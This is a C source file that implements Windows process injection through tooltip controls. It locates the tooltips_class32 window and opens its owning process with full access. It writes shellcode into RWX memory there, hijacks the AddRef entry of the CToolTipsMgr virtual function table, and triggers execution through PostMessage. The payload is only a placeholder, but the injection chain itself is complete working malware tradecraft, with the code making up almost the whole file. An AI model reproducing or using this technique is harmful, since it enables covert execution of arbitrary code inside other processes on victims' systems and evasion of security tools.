/*FindWindow("tooltips_class32"), GetWindowThreadProcessID, OpenProcess, VirtualAllocEx, WriteProcessMemory, VirtualFreeEx, CloseHandle*/
/*resources: https://modexp.wordpress.com/2019/08/10/windows-process-injection-tooltip-controls/ 
https://learn.microsoft.com/en-us/windows/win32/multimedia/virtual-function-tables
https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nf-unknwn-iunknown-addref*/
#include <windows.h>
#include <stdio.h>


typedef struct _IUnknown_VFT {
    PVOID QueryInterface;
    PVOID AddRef;// allows for writting shellcode 
    PVOID Release;
} IUnknown_VFT;

//payload,
char shellcode[] = {"payload here"};
    SIZE_T shellcodesize = sizeof(shellcode);

int main(void){

    DWORD pid, oldprotect;
    HWND hWindow = 0;
    HANDLE hProcess;
    LPVOID hLongptr, ds, hRemote, ptr;//p, ds, 
    SIZE_T rd, written; //readed memory from process
    IUnknown_VFT unk;// VFT- VIRTUAL FUNCTION TABLE - instance of Component Object Model, contains mothods of CToolTipsMgr Class 

    
    hWindow = FindWindow("tooltips_class32", 0);// tooltips are pop ups showing basic information about files, directories etc.
    if (hWindow == NULL)
    {
        printf("[-] unable to find tooltips_class32 window, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] window tooltips_class32 has been found\n");
    hLongptr  = (LPVOID)GetWindowLongPtr(hWindow, 0);//retrieves information about windows 0 pointer, which indicates on structure that stores data about pop up window itself. 
    
    if(GetWindowThreadProcessId(hWindow, &pid) == 0)// retrieves process id basing on the hWindows thread info.
    {
        printf("[-] unable to retriving PID, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] PID has been retrived, is: [%d]\n", pid);

//open process associiated with window
    hProcess =  OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL)
    {
        printf("[-] unable to open process, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] process has been opened\n");
        ReadProcessMemory(hProcess, hLongptr, &ptr, sizeof(ULONG_PTR), &rd);
        ReadProcessMemory(hProcess, ptr, &unk, sizeof(unk), &rd);

//3.allocate RWX memory and write payload there.
//update callback
    hRemote = VirtualAllocEx(hProcess, NULL, shellcodesize, MEM_RESERVE | MEM_COMMIT,  PAGE_EXECUTE_READWRITE);//cs
    if(hRemote == NULL){
        printf("[-] unable to allocate memory to required process, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] memory has been alloacted [%p]\n", hRemote);

    VirtualProtectEx(hProcess, hRemote, shellcodesize, PAGE_EXECUTE_READWRITE, &oldprotect);// to prevent 998 error from WriteProcessMemory
    if(WriteProcessMemory(hProcess, (LPVOID)hRemote, shellcode, shellcodesize, &written) == 0){
        printf("[-] unable to write shellcode, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] shellcode has been written, [%d]\n", written);


//4. allocate RW memory and write new CToolTipsMgr
    unk.AddRef = hRemote;// vtable modification, write payload address
    ds = VirtualAllocEx(hProcess, NULL, sizeof(unk), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(ds == NULL){
        printf("[-] unable to allocate CToolTipsMgr memory to required process, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] CToolTipsMgr memory has been alloacted [%p]\n", hRemote);

        if(WriteProcessMemory(hProcess, ds, &unk, sizeof(unk), &written) == 0){
        printf("[-] unable to write CToolTipsMgr memory of required process, error: [%d]\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
        printf("[+] CToolTipsMgr memory has been written, [%p]\n", &ds);

// 5. update pointer, trigger execution
    WriteProcessMemory(hProcess, hLongptr, &ds, sizeof(ULONG_PTR), &written);
    PostMessage(hWindow, WM_USER, 0, 0);// enforce restart window and execute shellcode
    Sleep(1);
    
//cleaning up
    WriteProcessMemory(hProcess, hLongptr, &ptr, sizeof(ULONG_PTR), &written);    
    VirtualFreeEx(hProcess, hRemote, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hProcess, ds, 0, MEM_DECOMMIT | MEM_RELEASE);


    CloseHandle(hProcess);
    return 0;
}
